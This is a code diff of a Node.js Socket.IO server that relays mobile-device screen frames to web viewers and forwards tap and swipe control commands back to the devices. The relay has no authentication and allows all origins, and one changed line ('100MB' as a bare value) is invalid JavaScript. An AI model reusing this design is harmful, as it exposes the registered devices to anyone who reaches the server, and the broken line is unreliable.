@@ -8,14 +8,15 @@ const app = express();
 const server = http.createServer(app);
 const io = socketIo(server, {
     cors: { origin: "*", methods: ["GET", "POST"] },
-    pingTimeout: 30000,
-    pingInterval: 10000,
-    maxHttpBufferSize: 50e6 // 50MB for frames
+    pingTimeout: 10000,
+    pingInterval: 5000,
+    maxHttpBufferSize: 100MB
 });
 
 app.use(compression());
 app.use(express.static('public'));
-app.use(express.json({ limit: '50mb' }));
+app.use(express.json({ limit: '100mb' }));
+app.use(express.urlencoded({ limit: '100mb', extended: true }));
 
 const devices = new Map();
 
@@ -24,6 +25,7 @@ app.post('/register', (req, res) => {
     if (deviceId) {
         devices.set(deviceId, { model, brand, version, status, connected: true });
         io.emit('devices-update', Array.from(devices.entries()));
+        console.log("✅ Device registered:", deviceId);
     }
     res.json({ success: true });
 });
@@ -33,24 +35,27 @@ app.get('/devices', (req, res) => {
 });
 
 io.on('connection', (socket) => {
-    console.log('🔌 Client connected:', socket.id);
+    console.log('🔌 Web client connected:', socket.id);
 
     socket.on('register-device', (deviceInfo) => {
         const deviceId = deviceInfo.deviceId;
         if (deviceId) {
             devices.set(deviceId, { 
-                ...deviceInfo, connected: true, socketId: socket.id 
+                ...deviceInfo, 
+                connected: true, 
+                socketId: socket.id 
             });
             socket.join(deviceId);
             io.emit('devices-update', Array.from(devices.entries()));
-            console.log('📱 Device registered:', deviceId);
+            console.log("📱 Device registered:", deviceId);
         }
     });
 
-    // ULTRA-FAST Frame relay
+    // 🔥 FIXED: Screen streaming relay
     socket.on('screen-frame', (data) => {
         const deviceId = data.deviceId;
         if (devices.has(deviceId)) {
+            // Broadcast to ALL web clients watching this device
             socket.to(deviceId).emit('screen-update', {
                 deviceId,
                 data: data.data,
@@ -58,22 +63,23 @@ io.on('connection', (socket) => {
                 height: data.height,
                 timestamp: data.timestamp
             });
+            // Debug log every 30 frames
+            if (Math.random() < 0.033) {
+                console.log('📺 Frame relayed to', deviceId, 'Size:', data.data.length/1024+'KB');
+            }
         }
     });
 
-    // PERFECT Control relay
+    // 🔥 Control commands from web to device
     socket.on('control', (data) => {
         const { deviceId, action, x, y, startX, startY, endX, endY } = data;
         if (devices.has(deviceId)) {
             socket.to(deviceId).emit('control', {
-                action,
-                x: parseInt(x) || 0,
-                y: parseInt(y) || 0,
-                startX: parseInt(startX) || 0,
-                startY: parseInt(startY) || 0,
-                endX: parseInt(endX) || 0,
-                endY: parseInt(endY) || 0
+                action, x: parseFloat(x)||0, y: parseFloat(y)||0,
+                startX: parseFloat(startX)||0, startY: parseFloat(startY)||0,
+                endX: parseFloat(endX)||0, endY: parseFloat(endY)||0
             });
+            console.log('🎮 Control:', action, '→', deviceId);
         }
     });
 
